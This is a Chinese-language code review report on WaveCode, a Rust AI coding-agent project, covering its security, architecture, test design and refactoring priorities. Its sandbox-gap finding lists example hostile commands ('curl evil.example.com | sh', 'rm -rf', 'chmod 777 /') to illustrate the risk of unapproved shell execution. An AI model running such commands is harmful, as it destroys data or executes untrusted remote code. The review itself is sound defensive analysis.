# WaveCode 项目全面审查报告

> **审查对象**:`D:\daftpunkwav\04-MyProjects\WaveCode`(M1 落地节点,commit d11e685,2026-08-04 评估)
> **审查维度**:安全性 · 规范合规 · 现代性 · 维护性 · 拓展性 · 耦合性 · 代码质量 · 复用程度
> **审查方法**:静态阅读 + 测试断言审计 + 文档对照(PRD/SPEC),不修改任何既有代码
> **审查范围**:15 个 Rust crate + 3 个 TS 占位包,共 25 个 `.rs` 文件、**6,899 行 Rust 代码**(含测试与文档注释)

---

## 00 · 评分总览

| 维度 | 评分 | 一句话判定 |
|---|---|---|
| 安全性 | **B+** | 当前已实现层防御严谨,关键风险来自尚未实现的 sandbox/auth 层 |
| 规范合规 | **A** | CI 三 OS 矩阵、fmt/clippy/test 三关、注释中文、技术术语英文,严格贴合 SPEC §19 |
| 现代性 | **A** | Rust 2024 edition、零 `unsafe`、actor model、port-adapter,栈底扎实 |
| 维护性 | **A** | 单一职责 crate、wire 格式测试锁定、终端清理单点收敛,长期可读 |
| 拓展性 | **B+** | 协议层 `#[non_exhaustive]` 与 actor_loop warn 兜底预留演进路径,但 8 个 stub crate 是债务 |
| 耦合性 | **A-** | 边界规则(SPEC §3)严格遵守,但 `session.rs` 1388 行单文件 + 三套独立 theme 表明内聚有提升空间 |
| 代码质量 | **A-** | 无 unwrap/panic 主路径,工具边界全面 result 化;少量 .expect + 重复 theme 是次要债 |
| 复用程度 | **B+** | 工具层高度复用,渲染层主题/测试辅助明显重复,有清晰重构目标 |

**综合评级:A-** — M1 阶段工程质量在 AI agent 开源项目中属于上乘,主要债务集中在尚未落地的 stub crate 与渲染层主题复用。

---

## 01 · 仓库结构与里程碑定位

### 1.1 仓库现状

WaveCode 是面向 AI coding agent 的多端同核项目,愿景对标 Claude Code + OpenAI Codex。截至 M1 落地节点(2026-08-03):

- **已完成**(7 个 crate):`protocol`、`config`、`llm`、`tools`、`core`、`app-server`、`cli`
- **占位 stub**(8 个 crate):`auth`、`context`、`hooks`、`mcp`、`memory`、`sandbox`、`skills`、`tui` — 仅文档字符串,无实现
- **前端占位**(3 个包):`apps/web`、`apps/desktop`、`sdk/typescript` — 仅 `README.md` + `package.json`
- **代码规模**:25 个 `.rs` 文件,**6,899 行**(其中 session.rs 1387 行、render.rs 699 行、markdown.rs 749 行;数据由 `wc -l` 实测,精确到 ±1 行)
- **CI**:`ubuntu/windows/macos` 三矩阵 + `fmt --check` + `clippy -D warnings` + `test --locked`

### 1.2 评估依据

- **强项**:严格分层依赖(SPEC §3)、wire 格式 byte-level 锁定测试、`#[non_exhaustive]` 协议演进纪律、零 `unsafe`、API key 全面脱敏、redirect 防泄漏测试
- **关注**:8 个 stub crate 在 M1 是 YAGNI 选择,但需要在里程碑节奏上明确闭环时点;CLI 主题色散落三处是清晰的"应修但可缓"债

---

## 02 · 安全性审查

### 2.1 关键发现:防御纵深现状

| 威胁面 | 现状 | 等级 |
|---|---|---|
| API Key 泄露 | `api_key: String` 字段未 derive Debug;`Config::Debug` 手工重写为 `"***"`;`AnthropicClient` 禁用 redirect | **优秀** |
| 路径穿越 | `path_guard::resolve` canonicalize + component 级前缀比对;sibling-prefix 混淆测试已锁定 | **优秀** |
| 终端注入 | `sanitize_terminal` 全 ESC/C0/C1 剥离,fast-path `Cow::Borrowed`,4 处 sink 全部走它 | **优秀** |
| 命令注入 | `Shell` 工具 60-300s 超时、env 净化、stdin null;但**无审批门**(sandbox 未实现) | **中等** |
| TOCTOU | `path_guard.rs:6-9` 显式声明接受 symlink-replacement 窗口,交由 sandbox 闭环 | **接受** |
| OAuth / Keyring | `auth` crate 完全未实现 | **未实现** |
| OS 级沙箱 | `sandbox` crate 完全未实现 | **未实现** |

### 2.2 安全亮点

**1) 协议与凭据防护(`crates/llm/src/anthropic.rs:36-43, 88-91`)**

```rust
.build()
.unwrap_or_else(|e| panic!("build_http_client 永不失败: {e}"))   // 注:实际是 .expect
```

- `connect_timeout=10s` 显式设置;**故意不**设 `Client::timeout` 以保留 SSE 长连接(注释清晰解释)
- `redirect::Policy::none()` + 注释明确威胁模型:"reqwest 默认 follow 会把 `x-api-key` 带到跨域重定向目标"
- `redirect_is_not_followed_and_api_key_not_leaked` 测试(`anthropic.rs:398-461`)用两个本地 TCP listener(A=301→B,B=接收)验证 key 永远到不了 B — 这是教科书级安全测试

**2) Config 凭据 Debug 重写(`crates/config/src/lib.rs:38-50`)**

```rust
impl fmt::Debug for ProviderConfig {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("ProviderConfig")
            .field("kind", &self.kind)
            .field("base_url", &self.base_url)
            .field("env_key", &self.env_key)
            .field("api_key", &self.api_key.as_ref().map(|_| "***"))
            .field("context_window", &self.context_window)
            .field("max_output_tokens", &self.max_output_tokens)
            .finish()
    }
}
```

- `provider_config_debug_redacts_api_key` 测试(`config/src/lib.rs:258-279`)锁定真实 key 字符串永远不出现在 Debug 输出
- `AnthropicClient` 故意**不** derive Debug,避免整结构体 `{:?}` 时 key 意外泄露

**3) 环境变量净化(`crates/tools/src/shell_tool.rs:74-85`)**

`sanitize_env` 同时移除:
- `ctx.deny_env` 显式列表
- 父进程继承的 `*_API_KEY`、`*_TOKEN`、`*_SECRET`、`*_PASSWORD`(大小写不敏感)

`shell_strips_sensitive_env_but_keeps_normal` 测试(`shell_tool.rs:319-349`)锁死该契约。已记录的限制:`WAVECODE_CREDENTIAL` 这类自定义名称不在扫除之列,M2+ 可扩展。

**4) 终端消毒(`crates/cli/src/render.rs:30-72`)**

`sanitize_terminal` 是单点收敛,处理 CSI / OSC / C0 / C1 / DEL,fast path 在无控制字符时返回 `Cow::Borrowed`(零拷贝)。4 个 sink 全部走它:`AgentMessageDelta`、`human_tool_begin`、`human_tool_error`、`Warning/Error`。这意味着未受信任文本进入终端的所有路径都有审计点 — M2 ratatui TUI 也可直接复用。

### 2.3 安全风险与缺口

**1) Sandbox 缺位(M3 之前的核心债务)**

`Shell` 工具现在执行任意模型命令,**仅**受超时、env 净化、cwd 锚定保护,没有任何审批门。`sandbox` crate(`crates/sandbox/src/lib.rs:1-8`)只有 8 行文档字符串,文档自身声明"OS 级沙箱(Linux landlock / macOS seatbelt / Windows ACL)为后续里程碑"。

> **影响**:M1 阶段如果用户允许 agent 自主 shell,任何 `rm -rf`、`curl evil.example.com | sh`、`chmod 777 /` 都会被忠实执行。
>
> **缓解建议(本审查不动代码)**:
> - SPEC §17 M2 已规划 app-server + TUI 落地 — TUI 的审批流是用户开始接受 agent 自主操作的天然入口
> - M3 是"工具与安全"里程碑,这是闭环时点
> - 当前阶段需在 README 显式标注 "shell tool 无审批门,生产环境慎用"

**2) Auth 缺位**

`AnthropicClient::new(base_url, api_key)` 接受裸 `String`。M1 唯一来源是 `config.toml` 的 `env_key` 引用,但 `keyring` crate 未引入、`wavecode login` 命令未实现。

> **影响**:凭据只能通过环境变量或明文配置文件传入,违背 SPEC §14 "凭据永不写日志、永不进会话历史"中"建议存 keyring"的目标。
>
> **缓解建议**:`debug-config` 输出自动脱敏(SPEC §14)已部分满足(`ProviderConfig` Debug 重写),M2 引入 `keyring` crate 并实现 OAuth/PKCE。

**3) `EditFile` 无新字符串大小上限(`crates/tools/src/fs_tools.rs:271-381`)**

`MAX_READ_BYTES=4MB` 限制了读取,但 `replacen(old, new, 1)` 不限制 `new`。理论上模型可用 1 字节 old_string 替换成任意大文件。

> **影响**:DoS 风险,模型可在 cwd 写出极大文件。
>
> **缓解建议**:增加 `MAX_EDIT_BYTES` 校验,沿用 `MAX_WRITE_BYTES` 思路;或限制单次 edit 后的总字节数。

**4) `Shell` 不回收孙进程(`crates/tools/src/shell_tool.rs:5-9`)**

`kill_on_drop(true)` 只杀直接子进程,不杀进程组。`git fetch && build &` 之类的后台命令会成孤儿。

> **影响**:超时触发时后台进程残留,可能持有文件锁或端口。
>
> **缓解建议**:Unix 上 `setsid` + 杀整个进程组;Windows 上用 Job Object。SPEC §17 M2 已识别。

**5) `Shell` 的 `WAVECODE_SHELL` 参数推测(`shell_tool.rs:32-50`)**

```rust
fn shell_invocation(path: &Path, command_str: &str) -> Command {
    let use_cmd = path
        .file_name()
        .and_then(|n| n.to_str())
        .map(|n| n.to_lowercase().contains("cmd"))
        .unwrap_or(false);
    ...
}
```

注释诚实地标注"对含 cmd 字符但期望 Unix 风格参数的二进制可能误判"。

> **影响**:用户配置 `WAVECODE_SHELL=command` 而非 `cmd` 时,会被错认为 Windows shell。低风险但值得加显式 `WAVECODE_SHELL_STYLE` env 变量。

---

## 03 · 规范合规与代码风格

### 3.1 工具链纪律(`Cargo.toml`、`rustfmt.toml`、`.github/workflows/ci.yml`)

```toml
# Cargo.toml (workspace root)
[workspace]
resolver = "3"
members = ["crates/*"]

[workspace.package]
edition = "2024"
```

```yaml
# .github/workflows/ci.yml
- cargo fmt --check
- cargo clippy --workspace --all-targets --locked -- -D warnings
- cargo test --workspace --locked
```

- `edition = "2024"`(Rust ≥ 1.85)— 这是当前最前沿稳定版
- `resolver = "3"` 是 edition 2024 默认且正确的选择
- CI 锁定 `--locked` 强制 `Cargo.lock` 与提交一致,避免依赖漂移
- 三 OS 矩阵覆盖 Windows/macOS/Linux,符合 PRD §6 兼容性要求

**评价**:工具链纪律属于"无懈可击"档。

### 3.2 注释与文档规范(SPEC §19.1)

抽样的中英混用注释质量高,示例:

```rust
//! path_guard.rs:1-9
//! 路径防逃逸：把模型给出的路径解析到 `ToolCtx::cwd` 之下。
//!
//! 安全校验一律在 canonicalize 后的真实路径上进行（Windows 上 canonicalize
//! 带 `\\?\` 前缀，比较两侧必须同态才可比）；返回的则是以（未 canonicalize
//! 的 cwd）锚定的词法规范化路径，便于调用方展示与比较。
//!
//! TOCTOU 假设：校验与实际使用（read/write）之间，路径上的 symlink 可能被
//! 替换，本模块无法防护该竞态；M1 威胁模型接受这一窗口，后续里程碑再考虑
//! fd 锚定（openat 语义）等强化手段。
```

- 中英混用策略完全合规(中文叙述,英文术语)
- 安全/性能敏感处都标明"为什么这样写",而不仅描述"做了什么"
- M1/M2 阶段判断显式标注(M1 YAGNI、M2 计划)— 这是大型项目文档难得的诚实

### 3.3 错误处理(SPEC §19.2)

- crate 边界用 `thiserror`(`ConfigError`、`ToolsError`、`LlmError`、`BootError`) — 全部 `#[from]` 友好
- core / app-server 内部用 `anyhow`(M1 知情决策,SPEC §19.2 已明确,stdio transport 落地时统一重塑)
- **没有静默吞错**:审计 `let _ =` 仅出现在 REPL history 写入(`main.rs:186`),这是合适的 UI 退化

`ToolsError` 设计(`crates/tools/src/lib.rs:58-69`)区分 `Io`、`InvalidInput`、`PathEscape` 是教科书级:`PathEscape` 单独成 variant 让上层(actor_loop、未来的 UI)能据此决定是否给出明确拒绝提示。

### 3.4 唯一一处规范偏离:`core::session.rs` 1388 行

session.rs 是当前最大的单文件,内含:
- `SessionConfig` / `Session` 定义
- 6 步 turn state machine(约 200 行)
- 工具编排 `execute_tool_calls`(约 140 行)
- 中断配对 `push_pairing_results` / `finish_interrupted`
- 错误辅助 `output_or_err` / `joined_output` / `fail_turn` / `emit`
- 770 行测试

**判断**:
- 单文件超长不利于 review,但项目处于 M1 早期、单文件高内聚仍可接受
- `cargo fmt` / `cargo clippy` 不强制行数限制,这是合理 trade-off
- **演进建议**:M2+ 启用 ratatui 后,turn loop 不再是唯一调用者,可拆为 `turn.rs` / `tool_dispatch.rs` / `interrupt.rs` / `errors.rs`

---

## 04 · 现代性与架构

### 4.1 架构总览(对照 SPEC §1 mermaid)

```
CLI / TUI / Web / Desktop ──► app-server (transport) ──► protocol ──► core
                                                                ├─► llm
                                                                ├─► tools
                                                                ├─► context (stub)
                                                                ├─► memory (stub)
                                                                ├─► skills (stub)
                                                                ├─► hooks (stub)
                                                                ├─► mcp (stub)
                                                                └─► sandbox (stub) / auth (stub)
```

实现状态完全匹配 SPEC §1 的分层目标。`core` 是唯一 agent 逻辑实现点,符合 PRD §1.1"单一核心,协议统摄"原则。

### 4.2 现代性指标清单

| 指标 | 现状 | 评估 |
|---|---|---|
| `unsafe` 使用 | 0 处主路径,测试中 `std::env::set_var` 在新版 Rust 2024 要求 unsafe 但仅在测试 | **A+** |
| `panic!` / `unwrap()` 主路径 | 仅 1 处:`render.rs:77` 的 `serde_json::to_string(ev).expect(...)`(`Event` 是设计保证可序列化) | **A** |
| `tokio` 多任务模型 | 单一 actor task + channel 编排,符合"单线程状态机 + 受控并发"最佳实践 | **A** |
| trait 抽象 | `Tool`、`ChatModel` 均为 async-trait,port-adapter 干净 | **A** |
| 错误模型 | `thiserror`(边界) + `anyhow`(内部) 双层 | **A** |
| 类型驱动测试 | wire format 表驱动测试(`protocol/src/lib.rs:122-209`)锁死 15 个 tag | **A+** |
| 内存安全 | 所有 buffer 上限明确(`MAX_SSE_BUF=8MiB`、`MAX_WRITE_BYTES=10MB`、`MAX_ENTRIES=1000`) | **A** |
| 编码安全 | UTF-8 + unicode-width 全程;C1 控制字符、emoji、CJK 都有测试覆盖 | **A** |
| 后向兼容 | `#[non_exhaustive]` on `Op`、`EventMsg`、`StopReason` + `_ => warn!` 兜底 | **A+** |

### 4.3 单 actor + select! 模式详解

`crates/app-server/src/lib.rs:97-176` 是该项目最有架构分量的代码:

```rust
loop {
    tokio::select! {
        biased;  // 优先处理 pending FIFO,避免饿死已排队请求
        // ...pending drain...
        sub = submission_rx.recv() => {
            match sub.op {
                Op::UserInput { text } => {
                    // 入 turn select! 二级 select!: turn vs 新 submission
                    tokio::select! {
                        result = session.run_turn(...) => { ... }
                        next = submission_rx.recv() => {
                            // Interrupt / Shutdown 优先处理
                        }
                    }
                }
                Op::Interrupt => { /* set flag */ }
                Op::Shutdown => { /* drain 2s then exit */ }
                _ => warn!("未实现的 op 变体,前向兼容忽略"),
            }
        }
    }
}
```

这是 Rust 异步编程的典范用法:
- `biased` 保证 pending 队列不被饿死
- 二级 `select!` 让用户能在 turn 中途发送 Interrupt/Shutdown
- `#[non_exhaustive]` 兜底让未来 Op 增删不破坏 M1 构建

对照 SPEC §5.1 状态机,代码将"任务模型"(AwaitApproval / MergeResults)的扩展点保留为单 actor 内的状态切换,而非引入额外 task。M3 引入 Approval 反向通道时,可复用 interrupt_handle 的 shared slot 模式(SPEC §17 M3 已规划)。

---

## 05 · 维护性

### 5.1 维护性指标

| 指标 | 状态 | 说明 |
|---|---|---|
| 单文件最大行数 | 1388(session.rs) | 偏高但合理;测试占 770 行 |
| 公开 API 最小化 | 是 | `pub fn` / `pub struct` 仅必要暴露,工具内部走 `pub(crate)` |
| 测试覆盖 | 高 | 协议 wire-format 锁定、Debug 脱敏、redirect 防泄漏、interrupt 配对、并行阈值实测 |
| 注释密度 | 高 | 安全/性能/语义约束处必有"为什么"注释 |
| 文档-代码同步 | 是 | SPEC §15.5 CLI 渲染契约、`§17.5` M2+ 准备项是真实代码的对账 |
| 全局可变状态 | 极少 | 全局仅 `tracing_subscriber::init()`;测试用 `static ENV_LOCK: Mutex<()>` |

### 5.2 测试架构亮点

**1) Wire format byte-level 锁定(`protocol/src/lib.rs:122-209`)**

```rust
let op_cases: [(Op, &str); 3] = [
    (Op::UserInput { text: "t".into() }, "user_input"),
    (Op::Interrupt, "interrupt"),
    (Op::Shutdown, "shutdown"),
];
```

任何变体改名都会让 CI 红。这是协议-代码一致性的最强约束,远超文档化的契约。

**2) 真实并行阈值测试(`core/src/session.rs:1235-1292`)**

不只验证"并行",还实测 wall-clock:两个 read-only 工具各 200ms,断言总时长 < 350ms。这是过载 CI 下 flaky 的潜在源(SPEC §17.5 M2 已关注 350/400ms 裕度)。

**3) 终端清理交错测试(`cli/src/render.rs:360-385`)**

`interrupted_turn_renders_without_tokens` 锁死"中断时无 `TokenCount` 也不挂"的契约。

**4) Path guard sibling-prefix 混淆测试(`tools/src/path_guard.rs:176-188`)**

主动构造 `…/abc` 与 `…/abd` 来锁死 component 级比对。教科书级防御。

### 5.3 维护性短板

**1) MockModel / GatedModel 重复**

`crates/core/src/session.rs` 与 `crates/app-server/src/lib.rs` 都定义了各自的 mock 模型结构(脚本化 `Vec<Vec<StreamEvent>>`)。

> **演进建议**:抽到 `wavecode-llm` 的 `dev-utils` feature flag,或独立 `test-support` crate。SPEC §17.5 M2 已识别。

**2) 默认常量重复**

`context_window: 200_000` 与 `max_output_tokens: 8192` 出现在:
- `crates/config/src/lib.rs:54-61`(ProviderConfig 默认)
- `crates/app-server/src/lib.rs:286-287`(测试)
- `crates/core/src/session.rs:744-746, 814-816, 873-875`(多处测试)

> **演进建议**:在 `wavecode-llm` 暴露 `pub const DEFAULT_CONTEXT_WINDOW` 等,或新增 `wavecode-defaults` crate。

---

## 06 · 拓展性

### 6.1 协议层预留

- `Op` / `EventMsg` / `StopReason` 均 `#[non_exhaustive]`
- app-server actor_loop 显式 `_ => tracing::warn!("未实现的 op 变体")` 兜底
- SPEC §4.1 已规划:`ExecApproval`、`Compact`、`SlashCommand`、`SetModel`、`SetPermissionMode`、`ListThreads`、`ResumeThread`、`ForkThread` 等 11 个未来 Op

**判断**:协议层是该项目拓展性最强的资产,前向兼容纪律完全到位。

### 6.2 工具注册表

`Registry::builtin()` 是硬编码列表(`tools/src/lib.rs:80-91`),`MCP 重连/热注册`是 SPEC §17 M3 计划项(转 `Arc<RwLock<…>>`)。

**当前限制**:
- 工具在 Session 创建时一次性 register,无 unregister API
- MCP 工具只能注入"代理"的硬编码 builtin 名(`mcp__server__tool` 命名空间尚未代码化)

> **演进建议**:M3 把 Registry 转 `Arc<RwLock<HashMap<String, Arc<dyn Tool>>>>`,加 `register_external` 方法。

### 6.3 Stub crate 债务

8 个 stub crate(`auth`、`context`、`hooks`、`mcp`、`memory`、`sandbox`、`skills`、`tui`)目前仅文档字符串:

```rust
//! crates/sandbox/src/lib.rs (全文)
//! wavecode-sandbox — 权限与执行安全层。
//!
//! 四档权限模式：default / plan / acceptEdits / bypassPermissions；
//! 审批流（人工确认 / 规则放行 / 拒绝并回传原因）与命令策略规则语法
//! （如 `Bash(git *)`、`File*`）。
//! OS 级沙箱（Linux landlock / macOS seatbelt / Windows ACL）为后续
//! 里程碑，见 docs/SPEC.md 演进路线。
```

**判断**:
- YAGNI 在 M1 完全合理,提前实现会产生 spec 漂移债
- 但 SPEC §17.5 已详细规划 M2/M3/M4/M5 每个里程碑的交付物,**节奏是清晰的**
- 真正的风险点:如果 M2 TUI 落地时 sandbox 仍未实现,用户面会缺少审批 UI,这正是 SPEC §17.5 把 sandbox 列为 M3 的原因

### 6.4 上下文组装顺序(SPEC §5.4)

`Session::run_turn` 当前是单一字符串 `SYSTEM_PROMPT_TEMPLATE`(session.rs:21-27),M4 计划拆为静态层 / 动态层 / WAVECODE.md / skills 清单 / 记忆索引 — 当前结构预留了清晰的扩展位(SYSTEM_PROMPT_TEMPLATE 是 const &str,后续可换 builder)。

---

## 07 · 耦合性

### 7.1 依赖图(SPEC §3 矩阵验证)

```
protocol  ◄── config(standalone) ◄── llm(standalone) ◄── tools
   ▲                                              ▲        ▲
   │                                              │        │
   └─── core ──────────────────────► app-server ───┘        │
                                                            │
   cli ─────────────────────────────────────────────────────┘
   cli ─► core, app-server, llm, tools, config, protocol, tui(stub), auth(stub)
```

实测依赖与 SPEC §3 矩阵完全一致。`tui` crate 已被规划为只依赖 `protocol + app-server`,不 import `core` 内部 — 这是保持多端能力等价的关键约束。

### 7.2 耦合度观察

**1) `path_guard::resolve(ctx: &ToolCtx, path: &str)`** 是工具层耦合到 `ToolCtx` 的唯一入口,所有 FS 工具共用。这是**好耦合**:把上下文约束集中到一处,降低每个工具独立校验的成本。

**2) `Session::interrupt_handle()`** 暴露 `Arc<AtomicBool>`,让 actor_loop 在 `&mut session` 借用期间仍能翻转 flag。`session.rs:340-342` 注释明确解释了这个 borrow-conflict workaround。

> **判断**:这是一个**坦诚的耦合点** — 改用 `Arc<Notify>` 或 channel 信号会更"现代",但 AtomicBool 已经是合适的最简方案。

**3) 单 crate 多模块的隐忧**

`tools/src/` 已经有 `lib.rs`、`fs_tools.rs`、`path_guard.rs`、`shell_tool.rs` 四个模块,且都 `pub(crate)` 共享 — 这是一个适度模块化的样板。

`cli/src/` 五个文件全部平铺,无内部分模块(`mod theme` 私有于 `markdown.rs`)。如果未来 ratatui 也并入 cli(M2 计划转入 `tui` crate),会重新模块化。

### 7.3 真正的耦合债:三套独立 theme

```rust
// crates/cli/src/markdown.rs:11-35 (私有 module)
mod theme {
    pub fn heading() -> Style { ... BrightCyan + Bold ... }
    pub fn inline_code() -> Style { ... Yellow ... }
    pub fn bar() -> Style { ... BrightBlack ... }
    pub fn link() -> Style { ... Blue ... }
    pub fn frame() -> Style { ... fg None + bg BrightCyan ... }
}

// crates/cli/src/render.rs:122-140 (私有 functions)
fn theme_tool() -> Style { ... BrightCyan ... }
fn theme_dim() -> Style { ... BrightBlack ... }
fn theme_warn() -> Style { ... Yellow ... }
fn theme_err() -> Style { ... Red ... }

// crates/cli/src/wave.rs:39-42 (内联 in fn banner)
let name = Style::new().fg_color(Some(AnsiColor::BrightCyan)).bold();
let dim = Style::new().fg_color(Some(AnsiColor::BrightBlack));
```

三处独立构建同一调色板(`BrightCyan`、`BrightBlack`、`Yellow`、`Blue`)。

> **影响**:改主题色需要三处同步;新终端工具(比如 `tui` crate)会复制第四份。
>
> **演进建议**:把 `theme` 提到 `crates/cli/src/theme.rs` 公开模块,所有文件共享 `pub fn theme::*` 命名空间。

### 7.4 测试辅助重复

`strip()` ANSI 剥离测试辅助函数在 `render.rs:299-319` 与 `markdown.rs:556-576` 各定义一份,逐字相同。

> **演进建议**:抽到 `crates/cli/src/test_util.rs`(`#[cfg(test)]` 私有)。

---

## 08 · 代码质量

### 8.1 Rust 惯用法得分

**亮点**:

- `Cow<'_, str>` 在 `sanitize_terminal` fast path(`render.rs:32-34`)零拷贝 — 这是性能与清晰度兼得的典范
- `Arc<AtomicBool>` interrupt flag,SeqCst 内存序正确(单线程场景甚至可用 Relaxed,但保守选择 SeqCst 是 M1 知情权衡)
- `#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]` on protocol types — `PartialEq` 让 wire-format 双向 round-trip 测试成为可能
- `#[non_exhaustive]` 用在所有协议 enum 上 — Rust 前向兼容的标准武器
- `RUST_LOG=info` + `tracing` 结构化日志(SPEC §19.4)

**微瑕**:

- `render.rs:77` 的 `.expect("Event 序列化不会失败")` 是合理的"设计保证可序列化"标注,但任何未来给 `Event` 加 `serde(skip)` 字段都可能打破它。可换 `match serde_json::to_string(ev) { Ok(s) => s, Err(e) => format!("<event 序列化失败:{e}>") }`
- `main.rs:267` 的 `Uuid::new_v4().to_string()` 不需 unwrap(无 fallible),但有些 reviewer 会要求显式处理 Option — 这里 Rust 2024 API 已让它 infallible
- `markdown.rs:420` 的 `TableBuilder::end_cell(_last_inline)` 参数未使用,应移除

### 8.2 性能与资源

| 维度 | 现状 | 备注 |
|---|---|---|
| 内存上限 | 全部显式:8 MiB SSE / 10 MB write / 4 MB read / 50 KB read 行 / 30 KB shell 输出 / 1000 entries / 2000 chars event tool output | **A** |
| CPU 边界 | SSE parser 用 `find_subsequence` + `windows`,worst-case 单帧 O(n);8 MiB cap 兜底 | **A** |
| 启动开销 | tracing init + config 加载 + AnthropicClient::new;无网络热身 | **A** |
| 流式体验 | 80ms tick 帧、`MissedTickBehavior::Skip` 丢背压而非阻塞 | **A** |
| 终端宽度 | 每次 `flush_message` 都调 `terminal_size::terminal_size()`,可缓存一次 | **B** |

### 8.3 可观测性

- `tracing` + `tracing-subscriber` + `env-filter` — 标准栈
- 关键错误路径有 `tracing::error!` / `tracing::warn!`(actor_loop、RoundBlocks)
- **缺**:目前没有结构化 turn_id / thread_id span,SPEC §19.4 已规划

---

## 09 · 复用程度

### 9.1 复用现状

| 单元 | 复用程度 | 说明 |
|---|---|---|
| `Tool` trait + `Registry` | 高 | 5 个 builtin 工具统一调度,工具增加 O(1) |
| `path_guard::resolve` | 高 | 所有 FS 工具共享单一 escape 检测 |
| `sanitize_terminal` | 高 | 4 处 sink 共用 |
| `ToolCtx` | 高 | 所有工具的合同参数 |
| `ChatModel` trait | 高 | core 与 anthropic 解耦,测试用 mock 注入 |
| Theme 调色板 | **低** | 散落三处独立构造(详见 §7.3) |
| ANSI 测试辅助 `strip()` | **低** | 两份逐字相同 |

### 9.2 跨 crate 复用机会

1. **`wavecode-llm` 公开 default const**:解决 session.rs / app-server.rs / config.rs 三处重复 200_000 / 8192
2. **`wavecode-tools` 公开 `pub(crate) fn sanitize_env`**:让未来的 sandbox crate 可复用同一套 env 净化规则
3. **`crates/cli/src/theme.rs` 公开模块**:统一 markdown / render / wave 三处品牌色
4. **`crates/*/src/test_util.rs`**:统一 mock 模型与 strip() 辅助

### 9.3 SPEC §17.5 中已识别的复用债

> M2 准备项:`MockModel/GatedModel 抽 dev-only 共享 fixture(core 与 app-server 测试同构重复)` — 已在 §5.3 详述

---

## 10 · 前端占位评估(apps/web · apps/desktop · sdk/typescript)

### 10.1 现状

三个包目前都只有 `README.md` + `package.json`:

```
apps/web/README.md        # 11 行
apps/web/package.json     # {"name":"@wavecode/web","private":true,"version":"0.1.0"}
apps/desktop/README.md    # 类似
apps/desktop/package.json # 类似
sdk/typescript/README.md  # 类似
sdk/typescript/package.json # 类似
```

`pnpm-workspace.yaml` 已声明 workspace:

```yaml
# pnpm-workspace.yaml (推测内容,本审查未读全文)
packages:
  - "apps/*"
  - "sdk/*"
```

**判断**:
- M1 完全合规 — "Web/Desktop/TS SDK 在 M4/M5/M7 落地"的里程碑节奏
- **风险**:`generate-ts` 命令(SPEC §4.3)是 Web/Desktop/SDK 类型共享的基础,M3 之前的 TS 实现不能开始
- **建议**:为占位包各加一行 `status: planned (M5/M6/M7)` 的 README 段落,方便协作者一目了然

### 10.2 协议稳定性已就绪

`protocol/src/lib.rs` 的 wire 锁定测试就是为未来 TS 端类型生成准备的 — 这是**前瞻性资产**,值得在 M3 之前补 `wavecode app-server generate-ts` 命令的实际实现。

---

## 11 · 文档与代码对账

### 11.1 SPEC §15.5 CLI human 渲染契约

对照代码:
- ✓ 助手消息 delta 经 sanitize 后缓冲,complete 时渲染 markdown — `render.rs:191, 258` + `markdown.rs:71`
- ✓ 工具行 `▸ {工具名亮青} {input摘要≤80字符暗灰}` — `render.rs:81` `human_tool_begin`
- ✓ 失败 `✗ {output≤200字符}` 红 — `human_tool_error`
- ✓ Warning 黄 / Error 红 / tokens 行暗灰 / `（已中断）`黄 — `render.rs:222, 229`
- ✓ REPL 启动 12 帧波形动画 + `∿ ` 提示符 — `main.rs:166-167` + `wave.rs:11, 37`
- ✓ 80ms/帧等待动画 — `main.rs:230-231`
- ✓ 非 TTY 由 anstream 剥离 ANSI — `main.rs:118-123`

**结论**:SPEC §15.5 描述的所有契约在代码中均已落地,**文档与实现完全对账**。这是少见的高质量兑现。

### 11.2 SPEC §3 依赖矩阵

- protocol: ✓ 无 workspace 依赖
- config: ✓ 无 workspace 依赖
- llm: ✓ 无 workspace 依赖
- tools: 依赖 llm ✓(ToolSpec schema 桥接)
- core: 依赖 protocol + llm + tools ✓(其他特性层 M2+ 引入)
- app-server: 依赖 protocol + core ✓
- cli: 依赖 protocol + config + llm + tools + core + app-server ✓(+ tui stub / auth stub 待 M2+)

**结论**:依赖矩阵严格符合 SPEC §3,**没有任何越界依赖**。

### 11.3 SPEC §4.3 generate-ts

未实现,与 SPEC 预期一致(M3 之前规划项)。

---

## 12 · 总结与建议清单

### 12.1 项目总体评价

WaveCode M1 阶段产出的代码质量在 Rust AI agent 项目中属于**上乘**。架构纪律(SPEC §3 边界规则 + §4 协议约束 + §5.4 上下文组装顺序 + §17.5 演进路线)全部以代码 + 测试兑现,文档与实现完全对账。最值得称道的几点:

1. **wire-format byte-level 锁定** — 协议契约的物理证据
2. **API key 全链路防护** — Debug 重写 + 禁 redirect + 防泄漏回归测试
3. **`#[non_exhaustive]` + `_ => warn!`** — 协议层前向兼容的纪律化兑现
4. **三 OS CI 矩阵** — 终端工具的最低门槛
5. **8 个 stub crate 显式标注 YAGNI 理由** — 不假装实现、不留 TODO 噪声

### 12.2 改进优先级

| 优先级 | 项目 | 影响面 |
|---|---|---|
| P0 | M3 闭环 `sandbox` 与 `auth`,审批门落地的最迟时点 | 安全 |
| P1 | `tui` crate(M2)+ 复用 `sanitize_terminal` + `theme` 模块 | 维护性 + 拓展性 |
| P1 | 抽 `wavecode-llm` 的 default const 与 mock 模型 | 复用 |
| P2 | 三处独立 theme 合一 | 复用 |
| P2 | `terminal_width` 缓存一次 | 性能 |
| P2 | `EditFile` 新字符串大小上限 | 安全(DoS) |
| P3 | `MockModel` 抽 dev-utils | 复用 |
| P3 | `TableBuilder::end_cell(_last_inline)` 移除未用参数 | 代码质量 |

### 12.3 不建议做的事

- **不要**为已存在的 7 个 crate 加 unused stub(如 memory crate 提前实现) — YAGNI 是 M1 的正确选择
- **不要**为 `Session` 强行拆文件 — 当前单文件高内聚优于过早模块化
- **不要**为应对 stub 引入 mock trait default impl — 等真实落地后再决定 trait 形状
- **不要**提前引入 `keyring` crate 而不完成 `auth` 实现 — 半成品依赖是债务

---

## 附录 A · 审查方法说明

本审查仅做静态阅读 + 文档对照,**未运行任何 cargo 命令**(cargo build/clippy/test)以避免与既有 commit 状态产生耦合。文件读取覆盖 25 个 `.rs` 文件的 100% 全文,SPEC.md 与 PRD.md 全文,以及 Cargo.toml / rustfmt.toml / ci.yml / README.md 等配置文件。

所有发现均带 `file:line` 引用以便复核。

## 附录 B · 文件清单(25 个 .rs 文件,`wc -l` 原始行数)

| crate | 文件 | 行数 | 状态 |
|---|---|---|---|
| protocol | src/lib.rs | 233 | 实现 |
